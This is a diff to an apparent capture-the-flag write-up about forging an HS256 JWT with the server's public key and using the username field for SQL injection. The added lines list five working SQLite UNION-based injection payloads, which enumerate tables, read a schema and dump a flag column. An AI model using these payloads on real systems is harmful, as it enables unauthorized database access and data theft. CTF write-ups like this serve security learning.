@@ -87,7 +87,7 @@ I learned from [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-j
 
 ### Custom Script
 I wrote a custom script to exploit this vulnerability by forging a JWT token with the HS256 algorithm, using the public key from the original token. This allowed me to manipulate the username field in the JWT payload, which was then passed to the vulnerable getUser function, leading to a successful SQL Injection attack.
-You can check it at ... .
+Look at that at [main.py](./scripts/main.py) .
 
 Install all the requirements:
 
@@ -95,7 +95,17 @@ Install all the requirements:
 pip3 install -r requirements.txt
 ```
 
+In the `main.py` file you need to change your target, once you have done, run the script like that:
 
+![image](https://github.com/user-attachments/assets/91f4c472-05a1-40d7-87c0-48ecfd10e42a)
+
+Hovewer before I found the right payload I executed the following SQL Injection:
+
+* `' OR 1 = 1 --`
+* `' OR 1 = 1 UNION SELECT 1, 2, 3 --`
+* `' OR 1 = 1 UNION SELECT 1, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'), 3 --`
+* `' OR 1 = 1 UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_storage'), 3 --`
+* `' OR 1 = 1 UNION SELECT 1, (SELECT top_secret_flaag FROM flag_storage), 3 --`
 
 ## Conclusion
 By combining JWT manipulation with SQL Injection, I was able to bypass authentication and retrieve sensitive data from the database. This challenge highlights the importance of secure coding practices, particularly in handling JWTs and SQL queries.
